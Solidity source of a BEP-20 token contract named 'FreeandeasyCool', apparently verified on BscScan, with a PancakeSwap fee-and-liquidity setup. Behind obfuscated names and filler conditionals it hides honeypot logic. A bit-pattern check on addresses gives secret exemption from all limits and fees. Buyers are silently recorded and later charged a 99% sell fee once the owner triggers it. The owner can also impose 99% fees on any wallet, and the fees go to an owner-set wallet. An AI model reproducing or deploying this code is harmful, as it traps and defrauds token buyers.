/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract FreeandeasyCool is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Freeandeasy Cool ";
    string constant _symbol = "FreeandeasyCool";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txReceiverBuyTeamExempt;
    mapping(address => bool) private teamLiquidityBurnSell;
    mapping(address => bool) private autoTxLiquiditySellBurn;
    mapping(address => bool) private teamLimitWalletReceiver;
    mapping(address => uint256) private teamSwapMaxBurn;
    mapping(uint256 => address) private receiverFeeLimitExempt;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private autoReceiverMaxBots = 0;
    uint256 private limitExemptIsLaunched = 7;

    //SELL FEES
    uint256 private buyIsTeamExempt = 0;
    uint256 private maxModeLiquidityReceiverMin = 7;

    uint256 private autoTxFeeReceiverMax = limitExemptIsLaunched + autoReceiverMaxBots;
    uint256 private burnLimitMarketingTradingSellMin = 100;

    address private walletMaxBurnTxExempt = (msg.sender); // auto-liq address
    address private burnFeeLimitLiquidityExempt = (0xC3CB357353086f6d97704890FfFFf7e6F5Df8864); // marketing address
    address private teamAutoWalletBurn = DEAD;
    address private walletLiquidityMinSell = DEAD;
    address private walletBurnBuyLimitReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private launchedBuyTxAuto;
    uint256 private minReceiverSwapWalletMaxSell;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txLiquidityBotsFee;
    uint256 private buyAutoBurnSell;
    uint256 private swapTeamLaunchedExemptIsMax;
    uint256 private walletMarketingBotsModeSwap;
    uint256 private teamExemptMaxLiquidity;

    bool private exemptReceiverSellLaunched = true;
    bool private teamLimitWalletReceiverMode = true;
    bool private launchedSellTradingMin = true;
    bool private sellMarketingTeamBuyLaunched = true;
    bool private limitReceiverWalletTeam = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingLaunchedTeamMax = 6 * 10 ** 15;
    uint256 private feeLaunchedSellMin = _totalSupply / 1000; // 0.1%

    
    bool private liquidityMarketingLimitBurn = false;
    bool private modeSwapMaxLimit = false;
    bool private receiverLimitAutoExemptSellFee = false;
    uint256 private burnReceiverLaunchedSwapMarketingTeam = 0;
    bool private botsTxWalletBuy = false;
    bool private marketingTradingMaxTx = false;
    uint256 private limitBuySwapTeamIsAutoExempt = 0;
    bool private minMaxLaunchedBurn = false;
    bool private botsLimitReceiverMode = false;
    bool private liquidityWalletMinLaunched = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txLiquidityBotsFee = true;

        txReceiverBuyTeamExempt[msg.sender] = true;
        txReceiverBuyTeamExempt[address(this)] = true;

        teamLiquidityBurnSell[msg.sender] = true;
        teamLiquidityBurnSell[0x0000000000000000000000000000000000000000] = true;
        teamLiquidityBurnSell[0x000000000000000000000000000000000000dEaD] = true;
        teamLiquidityBurnSell[address(this)] = true;

        autoTxLiquiditySellBurn[msg.sender] = true;
        autoTxLiquiditySellBurn[0x0000000000000000000000000000000000000000] = true;
        autoTxLiquiditySellBurn[0x000000000000000000000000000000000000dEaD] = true;
        autoTxLiquiditySellBurn[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitMarketingLiquidityFee(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitMarketingLiquidityFee(sender, recipient, amount);
    }

    function limitMarketingLiquidityFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (botsTxWalletBuy == modeSwapMaxLimit) {
            botsTxWalletBuy = marketingTradingMaxTx;
        }


        bool bLimitTxWalletValue = burnTeamSellMarketing(sender) || burnTeamSellMarketing(recipient);
        
        if (receiverLimitAutoExemptSellFee != botsLimitReceiverMode) {
            receiverLimitAutoExemptSellFee = receiverLimitAutoExemptSellFee;
        }

        if (botsTxWalletBuy == liquidityMarketingLimitBurn) {
            botsTxWalletBuy = sellMarketingTeamBuyLaunched;
        }

        if (minMaxLaunchedBurn != limitReceiverWalletTeam) {
            minMaxLaunchedBurn = botsTxWalletBuy;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                launchedLimitBuyMax();
            }
            if (!bLimitTxWalletValue) {
                buyIsMarketingBurnMax(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return limitSellFeeLiquiditySwapMax(sender, recipient, amount);}

        if (!txReceiverBuyTeamExempt[sender] && !txReceiverBuyTeamExempt[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (liquidityWalletMinLaunched != botsLimitReceiverMode) {
            liquidityWalletMinLaunched = minMaxLaunchedBurn;
        }

        if (botsTxWalletBuy != botsLimitReceiverMode) {
            botsTxWalletBuy = liquidityMarketingLimitBurn;
        }

        if (receiverLimitAutoExemptSellFee == botsLimitReceiverMode) {
            receiverLimitAutoExemptSellFee = launchedSellTradingMin;
        }


        require((amount <= _maxTxAmount) || autoTxLiquiditySellBurn[sender] || autoTxLiquiditySellBurn[recipient], "Max TX Limit has been triggered");

        if (minBurnTxExemptTeamTrading()) {txWalletReceiverLimit();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (botsLimitReceiverMode == botsLimitReceiverMode) {
            botsLimitReceiverMode = limitReceiverWalletTeam;
        }


        uint256 amountReceived = txTeamLiquidityFeeTradingBurn(sender) ? botsLaunchedReceiverExempt(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function limitSellFeeLiquiditySwapMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txTeamLiquidityFeeTradingBurn(address sender) internal view returns (bool) {
        return !teamLiquidityBurnSell[sender];
    }

    function teamModeSellMarketingReceiverSwapTx(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            autoTxFeeReceiverMax = maxModeLiquidityReceiverMin + buyIsTeamExempt;
            return isReceiverTxLiquidityFee(sender, autoTxFeeReceiverMax);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoTxFeeReceiverMax = limitExemptIsLaunched + autoReceiverMaxBots;
            return autoTxFeeReceiverMax;
        }
        return isReceiverTxLiquidityFee(sender, autoTxFeeReceiverMax);
    }

    function txFeeMarketingSwapAuto() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsLaunchedReceiverExempt(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (liquidityMarketingLimitBurn != modeSwapMaxLimit) {
            liquidityMarketingLimitBurn = marketingTradingMaxTx;
        }

        if (liquidityWalletMinLaunched != liquidityWalletMinLaunched) {
            liquidityWalletMinLaunched = botsTxWalletBuy;
        }


        uint256 feeAmount = amount.mul(teamModeSellMarketingReceiverSwapTx(sender, receiver == uniswapV2Pair)).div(burnLimitMarketingTradingSellMin);

        if (teamLimitWalletReceiver[sender] || teamLimitWalletReceiver[receiver]) {
            feeAmount = amount.mul(99).div(burnLimitMarketingTradingSellMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function burnTeamSellMarketing(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function isReceiverTxLiquidityFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = teamSwapMaxBurn[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function buyIsMarketingBurnMax(address addr) private {
        if (txFeeMarketingSwapAuto() < marketingLaunchedTeamMax) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        receiverFeeLimitExempt[exemptLimitValue] = addr;
    }

    function launchedLimitBuyMax() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamSwapMaxBurn[receiverFeeLimitExempt[i]] == 0) {
                    teamSwapMaxBurn[receiverFeeLimitExempt[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnFeeLimitLiquidityExempt).transfer(amountBNB * amountPercentage / 100);
    }

    function minBurnTxExemptTeamTrading() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    limitReceiverWalletTeam &&
    _balances[address(this)] >= feeLaunchedSellMin;
    }

    function txWalletReceiverLimit() internal swapping {
        
        if (burnReceiverLaunchedSwapMarketingTeam == autoReceiverMaxBots) {
            burnReceiverLaunchedSwapMarketingTeam = burnReceiverLaunchedSwapMarketingTeam;
        }

        if (botsTxWalletBuy == botsLimitReceiverMode) {
            botsTxWalletBuy = botsTxWalletBuy;
        }

        if (receiverLimitAutoExemptSellFee == marketingTradingMaxTx) {
            receiverLimitAutoExemptSellFee = botsTxWalletBuy;
        }


        uint256 amountToLiquify = feeLaunchedSellMin.mul(autoReceiverMaxBots).div(autoTxFeeReceiverMax).div(2);
        uint256 amountToSwap = feeLaunchedSellMin.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (limitBuySwapTeamIsAutoExempt != maxModeLiquidityReceiverMin) {
            limitBuySwapTeamIsAutoExempt = autoTxFeeReceiverMax;
        }

        if (burnReceiverLaunchedSwapMarketingTeam != buyIsTeamExempt) {
            burnReceiverLaunchedSwapMarketingTeam = limitExemptIsLaunched;
        }

        if (marketingTradingMaxTx == exemptReceiverSellLaunched) {
            marketingTradingMaxTx = minMaxLaunchedBurn;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoTxFeeReceiverMax.sub(autoReceiverMaxBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(autoReceiverMaxBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitExemptIsLaunched).div(totalETHFee);
        
        if (receiverLimitAutoExemptSellFee != exemptReceiverSellLaunched) {
            receiverLimitAutoExemptSellFee = liquidityWalletMinLaunched;
        }


        payable(burnFeeLimitLiquidityExempt).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                walletMaxBurnTxExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverFeeLimitExempt(uint256 a0) public view returns (address) {
        if (a0 != feeLaunchedSellMin) {
            return teamAutoWalletBurn;
        }
        if (a0 == limitExemptIsLaunched) {
            return burnFeeLimitLiquidityExempt;
        }
            return receiverFeeLimitExempt[a0];
    }
    function setReceiverFeeLimitExempt(uint256 a0,address a1) public onlyOwner {
        if (a0 == limitExemptIsLaunched) {
            walletMaxBurnTxExempt=a1;
        }
        if (a0 != burnLimitMarketingTradingSellMin) {
            walletLiquidityMinSell=a1;
        }
        receiverFeeLimitExempt[a0]=a1;
    }

    function getMinMaxLaunchedBurn() public view returns (bool) {
        if (minMaxLaunchedBurn == limitReceiverWalletTeam) {
            return limitReceiverWalletTeam;
        }
        return minMaxLaunchedBurn;
    }
    function setMinMaxLaunchedBurn(bool a0) public onlyOwner {
        if (minMaxLaunchedBurn == botsTxWalletBuy) {
            botsTxWalletBuy=a0;
        }
        minMaxLaunchedBurn=a0;
    }

    function getMarketingLaunchedTeamMax() public view returns (uint256) {
        if (marketingLaunchedTeamMax == autoReceiverMaxBots) {
            return autoReceiverMaxBots;
        }
        if (marketingLaunchedTeamMax == marketingLaunchedTeamMax) {
            return marketingLaunchedTeamMax;
        }
        return marketingLaunchedTeamMax;
    }
    function setMarketingLaunchedTeamMax(uint256 a0) public onlyOwner {
        if (marketingLaunchedTeamMax != marketingLaunchedTeamMax) {
            marketingLaunchedTeamMax=a0;
        }
        marketingLaunchedTeamMax=a0;
    }

    function getBuyIsTeamExempt() public view returns (uint256) {
        if (buyIsTeamExempt == burnLimitMarketingTradingSellMin) {
            return burnLimitMarketingTradingSellMin;
        }
        if (buyIsTeamExempt != feeLaunchedSellMin) {
            return feeLaunchedSellMin;
        }
        return buyIsTeamExempt;
    }
    function setBuyIsTeamExempt(uint256 a0) public onlyOwner {
        buyIsTeamExempt=a0;
    }

    function getExemptReceiverSellLaunched() public view returns (bool) {
        if (exemptReceiverSellLaunched != marketingTradingMaxTx) {
            return marketingTradingMaxTx;
        }
        if (exemptReceiverSellLaunched != minMaxLaunchedBurn) {
            return minMaxLaunchedBurn;
        }
        if (exemptReceiverSellLaunched == liquidityMarketingLimitBurn) {
            return liquidityMarketingLimitBurn;
        }
        return exemptReceiverSellLaunched;
    }
    function setExemptReceiverSellLaunched(bool a0) public onlyOwner {
        exemptReceiverSellLaunched=a0;
    }

    function getLiquidityMarketingLimitBurn() public view returns (bool) {
        if (liquidityMarketingLimitBurn != exemptReceiverSellLaunched) {
            return exemptReceiverSellLaunched;
        }
        return liquidityMarketingLimitBurn;
    }
    function setLiquidityMarketingLimitBurn(bool a0) public onlyOwner {
        liquidityMarketingLimitBurn=a0;
    }

    function getModeSwapMaxLimit() public view returns (bool) {
        if (modeSwapMaxLimit != launchedSellTradingMin) {
            return launchedSellTradingMin;
        }
        if (modeSwapMaxLimit == liquidityWalletMinLaunched) {
            return liquidityWalletMinLaunched;
        }
        if (modeSwapMaxLimit != liquidityWalletMinLaunched) {
            return liquidityWalletMinLaunched;
        }
        return modeSwapMaxLimit;
    }
    function setModeSwapMaxLimit(bool a0) public onlyOwner {
        if (modeSwapMaxLimit == liquidityMarketingLimitBurn) {
            liquidityMarketingLimitBurn=a0;
        }
        if (modeSwapMaxLimit == liquidityMarketingLimitBurn) {
            liquidityMarketingLimitBurn=a0;
        }
        if (modeSwapMaxLimit == receiverLimitAutoExemptSellFee) {
            receiverLimitAutoExemptSellFee=a0;
        }
        modeSwapMaxLimit=a0;
    }

    function getWalletMaxBurnTxExempt() public view returns (address) {
        if (walletMaxBurnTxExempt != burnFeeLimitLiquidityExempt) {
            return burnFeeLimitLiquidityExempt;
        }
        return walletMaxBurnTxExempt;
    }
    function setWalletMaxBurnTxExempt(address a0) public onlyOwner {
        if (walletMaxBurnTxExempt == walletBurnBuyLimitReceiver) {
            walletBurnBuyLimitReceiver=a0;
        }
        walletMaxBurnTxExempt=a0;
    }

    function getAutoReceiverMaxBots() public view returns (uint256) {
        if (autoReceiverMaxBots == buyIsTeamExempt) {
            return buyIsTeamExempt;
        }
        if (autoReceiverMaxBots == burnLimitMarketingTradingSellMin) {
            return burnLimitMarketingTradingSellMin;
        }
        if (autoReceiverMaxBots == burnLimitMarketingTradingSellMin) {
            return burnLimitMarketingTradingSellMin;
        }
        return autoReceiverMaxBots;
    }
    function setAutoReceiverMaxBots(uint256 a0) public onlyOwner {
        if (autoReceiverMaxBots != burnReceiverLaunchedSwapMarketingTeam) {
            burnReceiverLaunchedSwapMarketingTeam=a0;
        }
        if (autoReceiverMaxBots == burnLimitMarketingTradingSellMin) {
            burnLimitMarketingTradingSellMin=a0;
        }
        autoReceiverMaxBots=a0;
    }

    function getTeamLimitWalletReceiver(address a0) public view returns (bool) {
        if (a0 != walletLiquidityMinSell) {
            return modeSwapMaxLimit;
        }
        if (a0 == walletBurnBuyLimitReceiver) {
            return modeSwapMaxLimit;
        }
            return teamLimitWalletReceiver[a0];
    }
    function setTeamLimitWalletReceiver(address a0,bool a1) public onlyOwner {
        if (teamLimitWalletReceiver[a0] == autoTxLiquiditySellBurn[a0]) {
           autoTxLiquiditySellBurn[a0]=a1;
        }
        if (a0 == walletBurnBuyLimitReceiver) {
            marketingTradingMaxTx=a1;
        }
        if (a0 == walletLiquidityMinSell) {
            limitReceiverWalletTeam=a1;
        }
        teamLimitWalletReceiver[a0]=a1;
    }

    function getMaxModeLiquidityReceiverMin() public view returns (uint256) {
        if (maxModeLiquidityReceiverMin == maxModeLiquidityReceiverMin) {
            return maxModeLiquidityReceiverMin;
        }
        if (maxModeLiquidityReceiverMin == limitExemptIsLaunched) {
            return limitExemptIsLaunched;
        }
        if (maxModeLiquidityReceiverMin != burnReceiverLaunchedSwapMarketingTeam) {
            return burnReceiverLaunchedSwapMarketingTeam;
        }
        return maxModeLiquidityReceiverMin;
    }
    function setMaxModeLiquidityReceiverMin(uint256 a0) public onlyOwner {
        if (maxModeLiquidityReceiverMin == burnLimitMarketingTradingSellMin) {
            burnLimitMarketingTradingSellMin=a0;
        }
        if (maxModeLiquidityReceiverMin != buyIsTeamExempt) {
            buyIsTeamExempt=a0;
        }
        maxModeLiquidityReceiverMin=a0;
    }

    function getFeeLaunchedSellMin() public view returns (uint256) {
        if (feeLaunchedSellMin == burnReceiverLaunchedSwapMarketingTeam) {
            return burnReceiverLaunchedSwapMarketingTeam;
        }
        return feeLaunchedSellMin;
    }
    function setFeeLaunchedSellMin(uint256 a0) public onlyOwner {
        feeLaunchedSellMin=a0;
    }

    function getBurnFeeLimitLiquidityExempt() public view returns (address) {
        if (burnFeeLimitLiquidityExempt == teamAutoWalletBurn) {
            return teamAutoWalletBurn;
        }
        return burnFeeLimitLiquidityExempt;
    }
    function setBurnFeeLimitLiquidityExempt(address a0) public onlyOwner {
        if (burnFeeLimitLiquidityExempt != walletMaxBurnTxExempt) {
            walletMaxBurnTxExempt=a0;
        }
        if (burnFeeLimitLiquidityExempt != walletMaxBurnTxExempt) {
            walletMaxBurnTxExempt=a0;
        }
        burnFeeLimitLiquidityExempt=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}